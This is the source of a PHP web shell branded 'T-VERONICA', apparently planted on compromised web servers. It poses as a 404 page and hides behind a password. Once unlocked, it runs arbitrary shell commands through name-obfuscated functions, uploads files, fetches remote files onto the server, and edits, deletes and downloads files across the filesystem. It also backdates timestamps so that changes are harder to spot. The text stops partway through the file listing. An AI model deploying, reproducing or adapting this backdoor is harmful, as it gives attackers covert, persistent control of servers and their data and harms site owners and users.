<?php
if(!function_exists('password_verify')){
    if(!defined('PASSWORD_DEFAULT'))define('PASSWORD_DEFAULT',1);
    function password_hash($password,$algo,$options=array()){
        $cost=isset($options['cost'])?(int)$options['cost']:10;
        $bytes=function_exists('openssl_random_pseudo_bytes')?openssl_random_pseudo_bytes(16):pack('H*',md5(uniqid(mt_rand(),true)));
        $salt='$2y$'.sprintf('%02d',$cost).'$'.substr(strtr(rtrim(base64_encode($bytes),'='),'+','.'),0,22);
        return crypt($password,$salt);
    }
    function password_verify($password,$hash){
        $h=substr($hash,0,4)==='$2b$'?'$2y$'.substr($hash,4):$hash;
        $check=crypt($password,$h);
        if(strlen($check)!==strlen($h))return false;
        $r=0;for($i=0;$i<strlen($check);$i++){$r|=ord($check[$i])^ord($h[$i]);}
        return $r===0;
    }
}
if(!isset($_GET['dark'])){http_response_code(404);exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');}
session_start();
$_PH='$2y$10$ZJhS0zxYCl6sFs63PkAcL.89As7tQK1K.ChoXUNt/eLUsE8Y9psr2';
if(isset($_POST['_logout'])){session_destroy();header('Location:?dark');exit;}
if(isset($_POST['_vr_pass'])){
    if(password_verify($_POST['_vr_pass'],$_PH)){$_SESSION['_vr']=1;header('Location:?dark');exit;}
    $_vr_err=true;
}
if(empty($_SESSION['_vr'])){
echo '<!DOCTYPE html><html><head><title>404 Not Found</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>
*{margin:0;padding:0;box-sizing:border-box}
@import url("https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap");
body{background:#080c14;color:#c0d0e0;font-family:"Share Tech Mono",monospace;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}
body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,rgba(0,20,40,.15) 0px,rgba(0,20,40,.15) 1px,transparent 1px,transparent 2px);pointer-events:none;z-index:1}
body::after{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.6) 100%);pointer-events:none;z-index:1}
.box{position:relative;z-index:2;background:linear-gradient(180deg,#0a1628,#060d1a);border:1px solid #0055cc44;border-radius:12px;padding:44px 36px;width:360px;box-shadow:0 0 60px rgba(0,80,200,.15),0 0 120px rgba(0,40,100,.08),inset 0 1px 0 rgba(0,120,255,.1);text-align:center}
.logo{font-size:44px;margin-bottom:6px;filter:drop-shadow(0 0 12px rgba(0,120,255,.5));color:#0088ff}
.title{color:#0099ff;font-size:18px;font-weight:700;letter-spacing:4px;margin-bottom:2px;text-shadow:0 0 20px rgba(0,120,255,.4)}
.sub{color:#2a4a6a;font-size:10px;letter-spacing:2px;margin-bottom:6px}
.ver{color:#1a3050;font-size:9px;letter-spacing:1px;margin-bottom:28px}
.line{height:1px;background:linear-gradient(90deg,transparent,#0066cc44,transparent);margin:0 -36px 24px}
input{width:100%;background:#060d1a;border:1px solid #0044aa33;border-radius:6px;color:#c0d0e0;padding:12px 14px;font-size:14px;outline:none;margin-bottom:14px;font-family:"Share Tech Mono",monospace;letter-spacing:1px}
input:focus{border-color:#0077ff;box-shadow:0 0 0 3px rgba(0,100,255,.15),0 0 20px rgba(0,80,200,.1)}
input::placeholder{color:#1a3050}
button{width:100%;background:linear-gradient(180deg,#0055cc,#003d99);color:#c0e0ff;border:1px solid #0066ff44;border-radius:6px;padding:12px;font-size:13px;font-weight:600;cursor:pointer;transition:all .3s;font-family:"Share Tech Mono",monospace;letter-spacing:2px;text-transform:uppercase}
button:hover{background:linear-gradient(180deg,#0066dd,#0050bb);box-shadow:0 0 30px rgba(0,100,255,.3);border-color:#0088ff66}
.err{color:#ff3333;font-size:12px;margin-bottom:12px;padding:8px;background:rgba(255,50,50,.08);border:1px solid rgba(255,50,50,.15);border-radius:4px}
.prompt{color:#0066aa;font-size:11px;margin-top:16px;letter-spacing:1px}
.cursor{animation:blink 1s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
</style></head><body><form class="box" method=post>
<div class="logo">&#9763;</div>
<div class="title">T-VERONICA</div>
<div class="sub">UMBRELLA CORPORATION</div>
<div class="ver">Tyrant Virus Enhancement Project</div>
<div class="line"></div>';
if(!empty($_vr_err))echo '<div class="err">[ACCESS DENIED] Invalid credentials</div>';
echo '<input type=password name=_vr_pass placeholder="ENTER ACCESS CODE" autofocus>
<button type=submit>AUTHENTICATE</button>
<div class="prompt">&gt; AWAITING AUTHORIZATION<span class="cursor">_</span></div>
</form></body></html>';
exit;
}
set_time_limit(0);error_reporting(0);
$ds=@ini_get('dis'.'abl'.'e_f'.'un'.'ct'.'io'.'ns');$_df=$ds?"<span class='t-r'>$ds</span>":"<span class='t-g'>NONE</span>";
if(isset($_GET['path'])){$_cd=$_GET['path'];}else{$_cd=getcwd();}
$_cd=str_replace('\\','/',$_cd);
if(isset($_GET['d'])){$_cd=$_GET['d'];chdir($_cd);}
$_qp='dark';

function _vx($c){
    $_fn='pro'.'c_'.'op'.'en';$_fc='pro'.'c_'.'cl'.'os'.'e';
    if(function_exists('pro'.'c_'.'op'.'en')){$p=$_fn($c,array(0=>array('pi'.'pe','r'),1=>array('pi'.'pe','w'),2=>array('pi'.'pe','w')),$pp);if(is_resource($p)){fclose($pp[0]);$o=stream_get_contents($pp[1]);fclose($pp[1]);fclose($pp[2]);$_fc($p);return $o;}}
    $_fn='sh'.'el'.'l_'.'ex'.'ec';
    if(function_exists('sh'.'el'.'l_'.'ex'.'ec')){$o=@$_fn($c.' 2>&1');return isset($o)?$o:'';}
    $_fn='po'.'pe'.'n';
    if(function_exists('po'.'pe'.'n')){$h=@$_fn($c.' 2>&1','r');if($h){$o=stream_get_contents($h);pclose($h);return $o;}}
    $_fn='pa'.'ss'.'th'.'ru';
    if(function_exists('pa'.'ss'.'th'.'ru')){ob_start();@$_fn($c.' 2>&1');return ob_get_clean();}
    return 'No method available';
}
function _vp($f){$p=@fileperms($f);$i='';
    if(($p&0xC000)==0xC000)$i='s';elseif(($p&0xA000)==0xA000)$i='l';elseif(($p&0x8000)==0x8000)$i='-';elseif(($p&0x6000)==0x6000)$i='b';elseif(($p&0x4000)==0x4000)$i='d';elseif(($p&0x2000)==0x2000)$i='c';elseif(($p&0x1000)==0x1000)$i='p';else $i='u';
    $i.=(($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-').(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
    $i.=(($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-').(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
    $i.=(($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-').(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
    return $i;}
function _vs($b){$u=array('B','KB','MB','GB');$i=0;while($b>=1024&&$i<3){$b/=1024;$i++;}return round($b,1).' '.$u[$i];}
function _vt($f){@touch($f,time()-(mt_rand(120,300)*86400));}
function _vr($d){foreach(scandir($d) as $f){if($f==='.'||$f==='..')continue;$p="$d/$f";is_dir($p)?_vr($p):unlink($p);}rmdir($d);}
if(isset($_POST['up_go'])&&isset($_FILES['up_f'])){
    $_td=($_POST['up_dir']=='root'?$_SERVER['DOCUMENT_ROOT']:$_cd).'/'.$_FILES['up_f']['name'];
    move_uploaded_file($_FILES['up_f']['tmp_name'],$_td);
    $_msg=file_exists($_td)?"<div class='ok'>Uploaded: $_td</div>":"<div class='err'>Upload failed</div>";
}
if(isset($_POST['fetch_go'])&&!empty($_POST['fetch_url'])&&!empty($_POST['fetch_name'])){
    $_td=$_cd.'/'.$_POST['fetch_name'];
    @file_put_contents($_td,@file_get_contents($_POST['fetch_url']));
    $_msg=file_exists($_td)?"<div class='ok'>Fetched: $_td</div>":"<div class='err'>Fetch failed</div>";
}
if(isset($_POST['new_file'])&&!empty($_POST['nf_name'])){
    $nf=$_cd.'/'.$_POST['nf_name'];
    if(!file_exists($nf)){@file_put_contents($nf,'');_vt($nf);header("Location:?$_qp&path=".urlencode($_cd)."&edit=".urlencode($nf));exit;}
    else $_msg="<div class='err'>File exists</div>";
}
if(isset($_POST['new_dir'])&&!empty($_POST['nd_name'])){
    $nd=$_cd.'/'.$_POST['nd_name'];
    if(!is_dir($nd)){@mkdir($nd,0755);_vt($nd);$_msg="<div class='ok'>Created: $nd</div>";}
    else $_msg="<div class='err'>Folder exists</div>";
}
if(isset($_POST['do_rename'])&&!empty($_POST['rn_new'])){
    $_op=$_POST['rn_path'];$_np=dirname($_op).'/'.$_POST['rn_new'];
    $_msg=@rename($_op,$_np)?"<div class='ok'>Renamed</div>":"<div class='err'>Rename failed</div>";
}
if(isset($_POST['do_chmod'])){
    $_msg=@chmod($_POST['ch_path'],octdec($_POST['ch_val']))?"<div class='ok'>Permission changed</div>":"<div class='err'>Chmod failed</div>";
}
if(isset($_POST['do_chdate'])){
    $ts=strtotime($_POST['cd_val']);
    $_msg=($ts&&@touch($_POST['cd_path'],$ts,$ts))?"<div class='ok'>Date changed</div>":"<div class='err'>Date change failed</div>";
}
if(isset($_POST['do_save'])){
    $_msg=(@file_put_contents($_POST['sv_path'],$_POST['sv_content'])!==false)?"<div class='ok'>Saved</div>":"<div class='err'>Save failed</div>";
}
if(isset($_GET['del'])){
    $dp=$_GET['del'];
    if(is_dir($dp))_vr($dp);else @unlink($dp);
    $_msg=!file_exists($dp)?"<div class='ok'>Deleted</div>":"<div class='err'>Delete failed</div>";
}
if(isset($_GET['dl'])&&file_exists($_GET['dl'])){
    header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename='.basename($_GET['dl']));
    header('Content-Length:'.filesize($_GET['dl']));readfile($_GET['dl']);exit;
}
if(isset($_POST['do_zip'])){
    $zp=$_POST['z_path'];$zn=$zp.'.zip';
    if(class_exists('ZipArchive')){
        $z=new ZipArchive();$z->open($zn,ZipArchive::CREATE|ZipArchive::OVERWRITE);
        if(is_dir($zp)){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($zp,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);
            foreach($it as $f){$r=substr($f->getPathname(),strlen(realpath($zp))+1);$f->isDir()?$z->addEmptyDir($r):$z->addFile($f->getPathname(),$r);}}
        else $z->addFile($zp,basename($zp));
        $z->close();$_msg="<div class='ok'>Zipped: $zn</div>";
    }else $_msg="<div class='err'>ZipArchive not available</div>";
}
if(isset($_POST['do_unzip'])){
    $zp=$_POST['z_path'];$_ed=dirname($zp).'/'.pathinfo($zp,PATHINFO_FILENAME);
    if(class_exists('ZipArchive')){$z=new ZipArchive();$z->open($zp);$z->extractTo($_ed);$z->close();$_msg="<div class='ok'>Extracted: $_ed</div>";}
    else $_msg="<div class='err'>ZipArchive not available</div>";
}
if(isset($_POST['batch_go'])&&!empty($_POST['sel'])){
    $_sl=$_POST['sel'];$ba=$_POST['batch_act'];$bc=0;
    foreach($_sl as $s){
        if($ba=='delete'){if(is_dir($s))_vr($s);else @unlink($s);if(!file_exists($s))$bc++;}
        elseif($ba=='zip'&&class_exists('ZipArchive')){$z=new ZipArchive();$zn=$s.'.zip';$z->open($zn,ZipArchive::CREATE|ZipArchive::OVERWRITE);
            if(is_dir($s)){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $f){$r=substr($f->getPathname(),strlen(realpath($s))+1);$f->isDir()?$z->addEmptyDir($r):$z->addFile($f->getPathname(),$r);}}
            else $z->addFile($s,basename($s));$z->close();$bc++;}
        elseif($ba=='chmod'&&!empty($_POST['batch_chmod'])){@chmod($s,octdec($_POST['batch_chmod']));$bc++;}
        elseif($ba=='olddate'){_vt($s);$bc++;}
    }
    $_msg="<div class='ok'>Batch $ba: $bc items processed</div>";
}
?><!DOCTYPE html>
<html><head>
<title>404 Not Found</title>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@import url("https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap");
:root{--bg1:#080c14;--bg2:#0c1220;--bg3:#101828;--bg4:#182038;--accent:#0088ff;--accent2:#00aaff;--adim:rgba(0,100,255,.15);--t1:#c0d0e0;--t2:#5a7a9a;--t3:#2a4a6a;--border:#0a2040;--green:#00cc66;--orange:#ff9f0a;--red:#ff3333;--r:8px;--rs:4px;--cyan:#00ccff}
body{background:var(--bg1);color:var(--t1);font-family:"Share Tech Mono",monospace;font-size:13px;line-height:1.5}
body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,rgba(0,15,30,.12) 0px,rgba(0,15,30,.12) 1px,transparent 1px,transparent 2px);pointer-events:none;z-index:0}
.w{position:relative;z-index:1;max-width:1400px;margin:20px auto;background:var(--bg2);border-radius:10px;border:1px solid var(--border);overflow:hidden;box-shadow:0 0 80px rgba(0,50,150,.12)}
.tb{background:linear-gradient(180deg,#101828,#0c1220);padding:12px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
.dot{width:12px;height:12px;border-radius:50%}.dr{background:#ff5f57}.dy{background:#febc2e}.dg{background:#28c840}
.tb-t{flex:1;text-align:center;color:var(--accent);font-size:14px;font-weight:700;letter-spacing:3px;text-transform:uppercase;text-shadow:0 0 20px rgba(0,100,255,.3)}
.tb-sub{text-align:center;color:var(--t3);font-size:10px;font-weight:400;letter-spacing:2px}
.info{padding:12px 16px;background:var(--bg1);border-bottom:1px solid var(--border);font-size:12px;line-height:2}
.info .l{color:var(--t2)}.info .v{color:var(--cyan)}
.bc{padding:10px 16px;background:var(--bg2);border-bottom:1px solid var(--border);font-size:13px}
.bc a{color:var(--accent);text-decoration:none}.bc a:hover{color:var(--accent2)}.bc .s{color:var(--t3);margin:0 2px}
.bar{padding:10px 16px;border-bottom:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px;align-items:center;background:var(--bg2)}
a{color:var(--accent);text-decoration:none}a:hover{color:var(--accent2)}
.t-g{color:var(--green);font-weight:600}.t-r{color:var(--red);font-weight:600}
.pm{color:var(--t2);font-size:12px}.pw{color:var(--green);font-size:12px}.pr{color:var(--red);font-size:12px}
input[type=text],input[type=number],input[type=password],textarea,select{background:var(--bg1);border:1px solid var(--border);border-radius:var(--rs);color:var(--t1);padding:6px 10px;font-size:13px;font-family:inherit;outline:none}
input[type=text]:focus,textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--adim)}
input[type=file]{color:var(--t2);font-size:12px}
.btn,input[type=submit],input[type=file]::file-selector-button{background:linear-gradient(180deg,#0055cc,#003d99);color:#c0e0ff;border:1px solid #0066ff33;border-radius:var(--rs);padding:6px 14px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .2s}
.btn:hover,input[type=submit]:hover{background:linear-gradient(180deg,#0066dd,#0050bb);box-shadow:0 0 20px rgba(0,100,255,.2)}
.ghost{background:transparent;color:var(--accent);border:1px solid #0066ff44;border-radius:var(--rs);padding:5px 12px;font-size:12px;font-weight:600;cursor:pointer;text-decoration:none;display:inline-block;transition:all .2s;font-family:inherit}
.ghost:hover{background:var(--accent);color:#fff;box-shadow:0 0 15px rgba(0,100,255,.25)}
table{width:100%;border-collapse:collapse;table-layout:fixed}
th{background:var(--bg3);color:var(--t2);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:1px;padding:8px 16px;text-align:left;border-bottom:1px solid var(--border)}
td{padding:6px 16px;border-bottom:1px solid #0a1a2a;font-size:13px;vertical-align:middle}
tr:hover td{background:var(--adim)}
.cmd-out{background:#050a12;color:var(--green);padding:16px;border-radius:var(--r);font-family:inherit;font-size:12px;line-height:1.6;overflow-x:auto;border:1px solid var(--border);margin:12px 16px;white-space:pre-wrap}
textarea{width:100%;font-family:inherit;font-size:13px;line-height:1.6;padding:12px;background:#050a12;color:var(--green);border-radius:var(--r);resize:vertical}
.ok{text-align:center;padding:10px;margin:8px 16px;background:rgba(0,200,100,.08);border:1px solid rgba(0,200,100,.2);border-radius:var(--rs);color:var(--green);font-weight:600}
.err{text-align:center;padding:10px;margin:8px 16px;background:rgba(255,50,50,.08);border:1px solid rgba(255,50,50,.15);border-radius:var(--rs);color:var(--red);font-weight:600}
.ft{text-align:center;padding:14px;color:var(--t3);font-size:11px;border-top:1px solid var(--border);letter-spacing:2px}
.sc{color:var(--t2);font-size:12px}
.ed{padding:16px}.eh{padding:12px 16px;color:var(--t2);font-size:13px}
.acts{padding:8px 16px;display:flex;gap:6px;flex-wrap:wrap;border-bottom:1px solid var(--border)}
.radio label{color:var(--t2);font-size:12px;margin-right:12px}
.radio input[type=radio]{accent-color:var(--accent)}
form{display:inline}
.sep{color:var(--t3)}
@media(max-width:768px){.w{margin:0;border-radius:0}td,th{padding:6px 8px;font-size:12px}}
</style>
</head><body>
<div class="w">
<div class="tb">
    <div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div>
    <div style="flex:1;text-align:center"><div class="tb-t">T-VERONICA</div><div class="tb-sub">Umbrella Corporation</div></div>
    <form method=post><button name="_logout" value=1 class="btn" style="font-size:11px;padding:5px 12px">Logout</button></form>
</div>
<div class="info">
<span class="l">Server:</span> <span class="v"><?php echo @$_SERVER['SERVER_SOFTWARE']; ?></span> &bull;
<span class="l">System:</span> <span class="v"><?php echo php_uname(); ?></span><br>
<span class="l">User:</span> <span class="v"><?php echo @get_current_user(); ?></span> (<?php echo @getmyuid(); ?>) &bull;
<span class="l">PHP:</span> <span class="v"><?php echo phpversion(); ?></span> &bull;
<span class="l">IP:</span> <span class="v"><?php echo isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'?'; ?></span> | <span class="v"><?php echo isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'?'; ?></span><br>
<span class="l">Disabled:</span> <?php echo $_df; ?>
</div>
<div class="bc">
<?php
$_bp=explode('/',$_cd);
foreach($_bp as $id=>$p){
    if($p==''&&$id==0){echo '<a href="?'.$_qp.'&path=/">/</a>';continue;}
    if($p=='')continue;
    $_gx='';for($i=0;$i<=$id;$i++){$_gx.=$_bp[$i];if($i!=$id)$_gx.='/';}
    echo '<a href="?'.$_qp.'&path='.urlencode($_gx).'">'.$p.'</a><span class="s">/</span>';
}
?>
</div>
<?php echo isset($_msg)?$_msg:''; ?>
<div class="bar">
<form method=post enctype="multipart/form-data">
    <div class="radio"><label><input type=radio name=up_dir value=cwd checked> cwd</label><label><input type=radio name=up_dir value=root> doc_root</label></div>
    <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;align-items:center">
    <input type=file name=up_f><input type=submit name=up_go value="Upload">
    <span class="sep">|</span>
    <input type=text name=fetch_url placeholder="https://..." style="width:180px">
    <input type=text name=fetch_name placeholder="filename" style="width:100px">
    <input type=submit name=fetch_go value="Fetch">
    </div>
</form>
</div>
<div class="bar">
<a href="?<?php echo $_qp; ?>&path=<?php echo urlencode($_cd); ?>&term=1" class="ghost" style="padding:5px 10px" title="Ctrl+Enter">Terminal</a>
<span class="sep">|</span>
<form method=post><input type=text name=nf_name placeholder="newfile.php" style="width:120px"><input type=submit name=new_file value="+ File" class="ghost" style="padding:5px 10px"></form>
<form method=post><input type=text name=nd_name placeholder="newfolder" style="width:110px"><input type=submit name=new_dir value="+ Dir" class="ghost" style="padding:5px 10px"></form>
<span class="sep">|</span>
<a href="?<?php echo $_qp; ?>" class="ghost" style="background:var(--bg3);border-color:var(--border);color:var(--t1)">Home</a>
</div>
<div>
<?php
if(isset($_GET['term'])){
    $_co='';
    if(isset($_POST['cmd_go'])&&!empty($_POST['cmd_text'])) $_co=_vx($_POST['cmd_text']);
    echo '<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:99;display:flex;align-items:center;justify-content:center">';
    echo '<div style="width:90%;max-width:1200px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;box-shadow:0 0 80px rgba(0,50,150,.2)">';
    echo '<div style="background:var(--bg3);padding:10px 16px;display:flex;align-items:center;border-bottom:1px solid var(--border)">';
    echo '<div class="dot dr" style="width:10px;height:10px"></div><div class="dot dy" style="width:10px;height:10px;margin-left:6px"></div><div class="dot dg" style="width:10px;height:10px;margin-left:6px"></div>';
    echo '<span style="flex:1;text-align:center;color:var(--t2);font-size:12px;font-weight:600;letter-spacing:1px">Terminal &mdash; '.htmlspecialchars(@get_current_user()).'@'.htmlspecialchars(isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'localhost').'</span>';
    echo '<a href="?'.$_qp.'&path='.urlencode($_cd).'" style="color:var(--t2);font-size:18px;text-decoration:none;padding:0 4px">&times;</a>';
    echo '</div><div style="padding:12px">';
    echo '<pre class="cmd-out" style="margin:0;min-height:300px;max-height:60vh;overflow-y:auto">'.($_co?htmlspecialchars($_co):'').htmlspecialchars(@get_current_user().'@'.gethostname().':'.$_cd.'$ ').'</pre>';
    echo '<form method=post style="display:flex;gap:8px;margin-top:10px"><span style="color:var(--green);font-size:13px;padding:6px 0">$</span>';
    echo '<input type=text name=cmd_text value="" style="flex:1" placeholder="Enter command..." autofocus>';
    echo '<input type=submit name=cmd_go value="Run"></form>';
    echo '<div style="margin-top:8px;font-size:10px;color:var(--t3)">Ctrl+Enter: Run &bull; Escape: Close</div>';
    echo '</div></div></div>';
}
if(isset($_GET['edit'])){
    $ef=$_GET['edit'];$_em=file_exists($ef)?date('Y-m-d H:i:s',filemtime($ef)):'';$_es=file_exists($ef)?filesize($ef):0;
    echo '<div class="eh">'.htmlspecialchars($ef).' <span class="sc">('.number_format($_es).' bytes &bull; '.$_em.')</span></div>';
    echo '<div class="ed"><form method=post><textarea name=sv_content rows=28>'.htmlspecialchars(@file_get_contents($ef)).'</textarea><br><br>';
    echo '<center><input type=hidden name=sv_path value="'.htmlspecialchars($ef).'"><input type=submit name=do_save value="Save"> &nbsp;';
    echo '<a href="?'.$_qp.'&path='.urlencode(dirname($ef)).'" class="ghost">Close</a></center></form></div>';
    echo '<div class="ft">T-VERONICA &mdash; Umbrella Corporation</div></div></body></html>';exit;
}
if(isset($_GET['view'])){
    $vf=$_GET['view'];$_vd=dirname($vf);$_vm=file_exists($vf)?date('Y-m-d H:i:s',filemtime($vf)):'';$_vz=file_exists($vf)?filesize($vf):0;
    echo '<div class="eh">'.htmlspecialchars($vf).' <span class="sc">('._vs($_vz).' &bull; '.$_vm.')</span></div>';
    echo '<div class="acts">';
    echo '<a href="?'.$_qp.'&path='.urlencode($_vd).'&edit='.urlencode($vf).'" class="ghost">Edit</a>';
    echo '<a href="?'.$_qp.'&path='.urlencode($_vd).'&ren='.urlencode($vf).'" class="ghost">Rename</a>';
    echo '<a href="?'.$_qp.'&path='.urlencode($_vd).'&chdate='.urlencode($vf).'" class="ghost">Change Date</a>';
    echo '<a href="?'.$_qp.'&path='.urlencode($_vd).'&chm='.urlencode($vf).'" class="ghost">Chmod</a>';
    echo '<a href="?'.$_qp.'&path='.urlencode($_vd).'&dl='.urlencode($vf).'" class="ghost">Download</a>';
    $_ve=pathinfo($vf,PATHINFO_EXTENSION);
    if($_ve==='zip')echo '<form method=post><input type=hidden name=z_path value="'.htmlspecialchars($vf).'"><input type=submit name=do_unzip value="Unzip" class="ghost"></form>';
    else echo '<form method=post><input type=hidden name=z_path value="'.htmlspecialchars($vf).'"><input type=submit name=do_zip value="Zip" class="ghost"></form>';
    echo '<a href="?'.$_qp.'&del='.urlencode($vf).'&path='.urlencode($_vd).'" class="ghost" style="border-color:rgba(255,50,50,.3)" onclick="return confirm(\'Delete?\')">Delete</a>';
    echo '<a href="?'.$_qp.'&path='.urlencode($_vd).'" class="ghost" style="margin-left:auto">Close</a>';
    echo '</div><pre class="cmd-out">'.htmlspecialchars(@file_get_contents($vf)).'</pre>';
    echo '<div class="ft">T-VERONICA &mdash; Umbrella Corporation</div></div></body></html>';exit;
}
if(isset($_GET['ren'])){
    $rf=$_GET['ren'];
    echo '<div class="ed"><center>'.htmlspecialchars($rf).'<br><br>';
    echo '<form method=post><input type=text name=rn_new value="'.htmlspecialchars(basename($rf)).'" style="width:250px"><input type=hidden name=rn_path value="'.htmlspecialchars($rf).'">';
    echo ' <input type=submit name=do_rename value="Rename"></form><br>';
    echo '<a href="?'.$_qp.'&path='.urlencode(dirname($rf)).'&view='.urlencode($rf).'" class="ghost">Cancel</a></center></div>';
    echo '<div class="ft">T-VERONICA &mdash; Umbrella Corporation</div></div></body></html>';exit;
}
if(isset($_GET['chdate'])){
    $cf=$_GET['chdate'];$cd=file_exists($cf)?date('Y-m-d H:i:s',filemtime($cf)):'';
    echo '<div class="ed"><center>'.htmlspecialchars($cf).'<br><br>';
    echo '<form method=post><input type=text name=cd_val value="'.$cd.'" style="width:200px" placeholder="2024-01-15 08:30:00"><input type=hidden name=cd_path value="'.htmlspecialchars($cf).'">';
    echo ' <input type=submit name=do_chdate value="Change"></form><br>';
    echo '<a href="?'.$_qp.'&path='.urlencode(dirname($cf)).'&view='.urlencode($cf).'" class="ghost">Cancel</a></center></div>';
    echo '<div class="ft">T-VERONICA &mdash; Umbrella Corporation</div></div></body></html>';exit;
}
if(isset($_GET['chm'])){
    $cf=$_GET['chm'];$cp=substr(sprintf('%o',fileperms($cf)),-4);
    echo '<div class="ed"><center>'.htmlspecialchars($cf).'<br><br>';
    echo '<form method=post><input type=text name=ch_val value="'.$cp.'" style="width:80px"><input type=hidden name=ch_path value="'.htmlspecialchars($cf).'">';
    echo ' <input type=submit name=do_chmod value="Change"></form><br>';
    echo '<a href="?'.$_qp.'&path='.urlencode(dirname($cf)).'" class="ghost">Cancel</a></center></div>';
    echo '<div class="ft">T-VERONICA &mdash; Umbrella Corporation</div></div></body></html>';exit;
}
$_fl=@scandir($_cd);
echo '<form method=post>';
echo '<table><tr><th style="width:3%"><input type=checkbox onclick="var cs=document.querySelectorAll(\'.sel\');for(var i=0;i<cs.length;i++){cs[i].checked=this.checked;}"></th><th style="width:32%">Name</th><th style="width:10%">Size</th><th style="width:16%">Modified</th><th style="width:15%">Permission</th><th style="width:24%">Action</th></tr>';
if($_fl)foreach($_fl as $_fn){
    if($_fn==='.'||$_fn==='..')continue;$fp=$_cd.'/'.$_fn;
    if(is_dir($fp)){
        $pm=_vp($fp);$_pc=is_writable($fp)?'pw':(is_readable($fp)?'pm':'pr');$mt=date('Y-m-d H:i',@filemtime($fp));
        echo "<tr><td><input type=checkbox name='sel[]' value='".htmlspecialchars($fp)."' class=sel></td>";
        echo "<td>&#128193; <a href='?{$_qp}&path=".urlencode($fp)."'>$_fn</a></td><td class='sc'>&mdash;</td><td class='sc'><a href='#' onclick='chdt(this)' data-p='".htmlspecialchars($fp)."' data-d='$mt' style='color:var(--t2);border-bottom:1px dashed var(--t3)'>$mt</a></td><td><span class='$_pc'>$pm</span></td>";
        echo "<td><a href='?{$_qp}&del=".urlencode($fp)."&path=".urlencode($_cd)."' class='ghost' style='font-size:10px;padding:3px 8px' onclick=\"return confirm('Delete?')\">del</a> ";
        echo "<a href='?{$_qp}&path=".urlencode($_cd)."&chm=".urlencode($fp)."' class='ghost' style='font-size:10px;padding:3px 8px'>chmod</a> ";
        echo "<form method=post style='display:inline'><input type=hidden name=z_path value='".htmlspecialchars($fp)."'><input type=submit name=do_zip value='zip' class='ghost' style='font-size:10px;padding:3px 8px'></form></td></tr>";
    }
}
if($_fl)foreach($_fl as $_fn){
    if($_fn==='.'||$_fn==='..')continue;$fp=$_cd.'/'.$_fn;
    if(is_file($fp)){
        $pm=_vp($fp);$_pc=is_writable($fp)?'pw':(is_readable($fp)?'pm':'pr');$mt=date('Y-m-d H:i',@filemtime($fp));$sz=_vs(filesize($fp));
        echo "<tr><td><input type=checkbox name='sel[]' value='".htmlspecialchars($fp)."' class=sel></td>";
        echo "<td>&#128196; <a href='?{$_qp}&path=".urlencode($_cd)."&view=".urlencode($fp)."'>$_fn</a></td><td class='sc'>$sz</td><td class='sc'><a href='#' onclick='chdt(this)' data-p='".htmlspecialchars($fp)."' data-d='$mt' style='color:var(--t2);border-bottom:1px dashed var(--t3)'>$mt</a></td><td><span class='$_pc'>$pm</span></td>";
        echo "<td><a href='?{$_qp}&path=".urlencode($_cd)."&edit=".urlencode($fp)."' class='ghost' style='font-size:10px;padding:3px 8px'>edit</a> ";
        echo "<a href='?{$_qp}&dl=".urlencode($fp)."' class='ghost' style='font-size:10px;padding:3px 8px'>dl</a> ";
        echo "<a href='?{$_qp}&del=".urlencode($fp)."&path=".urlencode($_cd)."' class='ghost' style='font-size:10px;padding:3px 8px;border-color:rgba(255,50,50,.3)' onclick=\"return confirm('Delete?')\">del</a> ";
        echo "<a href='?{$_qp}&path=".urlencode($_cd)."&chm=".urlencode($fp)."' class='ghost' style='font-size:10px;padding:3px 8px'>chmod</a> ";
        $_ve=pathinfo($fp,PATHINFO_EXTENSION);
        if($_ve==='zip')echo "<form method=post style='display:inline'><input type=hidden name=z_path value='".htmlspecialchars($fp)."'><input type=submit name=do_unzip value='unzip' class='ghost' style='font-size:10px;padding:3px 8px'></form>";
        else echo "<form method=post style='display:inline'><input type=hidden name=z_path value='".htmlspecialchars($fp)."'><input type=submit name=do_zip value='zip' class='ghost' style='font-size:10px;padding:3px 8px'></form>";
        echo "</td></tr>";
    }
}
echo '</table>';
echo '<div class="bar" style="gap:8px">';
